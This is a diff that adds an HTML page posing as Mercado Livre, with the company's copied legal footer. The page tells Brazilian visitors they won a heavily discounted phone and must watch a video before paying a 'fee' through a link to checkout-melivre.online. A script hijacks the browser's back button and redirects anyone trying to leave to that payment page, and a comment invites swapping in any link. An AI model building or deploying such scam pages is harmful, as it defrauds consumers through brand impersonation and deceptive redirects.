@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <title>Mercado Livre</title>
+    <link rel="stylesheet" href="css/products.css">
+    <link rel="stylesheet" href="css/styles.css">
+    <link rel="stylesheet" href="css/fonts.css">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@24,400,1,0">
+    <link rel="icon" href="images/favicon.png">
+    <link rel="shortcut icon" href="images/favicon.png">
+    <style>
+        #resgate-btn {
+            display: none;
+            margin-top: 20px;
+            padding: 10px 20px;
+            font-family: 'GellixBold';
+            font-size: 16px;
+            color: white;
+            background-color: #e6cf00;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            text-decoration: none; /* Remove underline from link */
+        }
+        .button-container {
+            display: flex;
+            justify-content: center;
+        }
+    </style>
+    <script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-47R4TWL53Z');
+</script>
+ <script>
+        window.onload = function () {
+            var links = document.getElementsByTagName("a");
+            for (var i = 0, n = links.length; i < n; i++) {
+                var href = links[i].href.trim() +
+                        (links[i].href.indexOf("?") > 0 ? '&' : '?') +
+                        document.location.search.replace('?', '').toString();
+                links[i].href = href;
+            }
+        }
+    </script>
+     <script>
+        // ALTERE O LINK PARA A PÁGINA QUE QUISER MOSTRAR QUANDO O USUÁRIO TENTAR SAIR
+        const link = 'https://pay.checkout-melivre.online/a6pVgd4nvRbgk7B?utm_content=taxa';
+        function setBackRedirect(url) {
+          let urlBackRedirect = url;
+          urlBackRedirect = urlBackRedirect =
+            urlBackRedirect.trim() +
+            (urlBackRedirect.indexOf('?') > 0 ? '&' : '?') +
+            document.location.search.replace('?', '').toString();
+          history.pushState({}, '', location.href);
+          history.pushState({}, '', location.href);
+          history.pushState({}, '', location.href);
+          window.addEventListener('popstate', () => {
+            console.log('onpopstate', urlBackRedirect);
+            setTimeout(() => {
+              location.href = urlBackRedirect;
+            }, 1);
+          });
+        }
+        setBackRedirect(link);
+      </script>
+</head>
+<body>
+    <div style="background-color: #e6cf00; text-align: center; padding: 5px; font-family: 'GellixMedium'; font-size: 13px; color: white">Promoção exclusiva: 25 anos</div>
+
+    <nav class="navbar" style="padding-top: 15px;">
+        <div class="menu-icon" style="padding-left: 3%;">
+            <img src="images/logo.webp" style="height: 5vh;" alt="Logo Central Vivara">
+        </div>
+
+        <div class="logo-central"></div>
+
+        <div class="menu-icon" style="padding-right: 3%;">
+            <span class="material-symbols-outlined" style="font-size: 30px; padding-right: 10px; color: black">menu</span>
+        </div>
+    </nav>
+
+    <img src="images/bannerpoco.png" style="width: 100%; margin-top: -2px;">
+
+    <!-- Novo bloco de título e texto -->
+    <div class="section-title" style="text-align: center; margin-top: 20px; padding: 10px;">
+        <h1 style="font-family: 'GellixBold'; font-size: 24px; color: #333;">ATENÇÃO, ASSISTA O VIDEO ABAIXO PARA CONCLUIR O RESGATE DO SEU PRODUTO!</h1>
+        <p style="font-family: 'GellixRegular'; font-size: 16px; color: #666;">Parabéns por ter conseguido resgatar seu celular com mais de 90% de desconto!
+            <br><br>
+            Agora para seguir com o despache da sua mercadoria, basta seguir as informações do vídeo abaixo!
+            <br><br>
+            Assista o video com atenção para que seu produto seja entregue!
+        </p>
+
+        <div id="video-container" style="position: relative; width: 100%; padding-top: 56.25%; border-radius: 15px; overflow: hidden;">
+            <video id="video" controls style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; border-radius: 15px;">
+                <source src="taxa.mp4" type="video/mp4">
+            </video>
+        </div>
+
+        <!-- Contêiner para centralizar o botão -->
+        <div class="button-container">
+            <a href="https://pay.checkout-melivre.online/a6pVgd4nvRbgk7B?utm_content=taxa" id="resgate-btn">Resgatar Produto</a>
+        </div>
+    </div>
+
+    <div class="divisoria2"></div>
+
+    <p style="margin-left: 3%; margin-right: 3%; font-family: 'GellixRegular'; font-size: 14px; padding-top: 5px;">
+        <span style="font-family: 'GellixSemiBold';">Termos e condições. Como cuidamos da sua privacidade. Acessibilidade Informações sobre seguros Blog Afiliados Tendências</span>
+        <br><br>© 1999-2024 Ebazar.com.br LTDA. CNPJ n.º 03.007.331/0001-41 / Av. das Nações Unidas, nº 3.003, Bonfim, Osasco/SP - CEP 06233-903 - empresa do grupo Mercado Livre.
+        <span style="font-family: 'GellixSemiBold';"><br><br>Brasil/Português</span>
+    </p>
+
+    <script>
+        // Função para mostrar o botão após 40 segundos
+        function mostrarBotao() {
+            document.getElementById('resgate-btn').style.display = 'block';
+        }
+        
+        // Chama a função após 40 segundos
+        setTimeout(mostrarBotao, 5000);
+    </script>
+</body>
+</html>
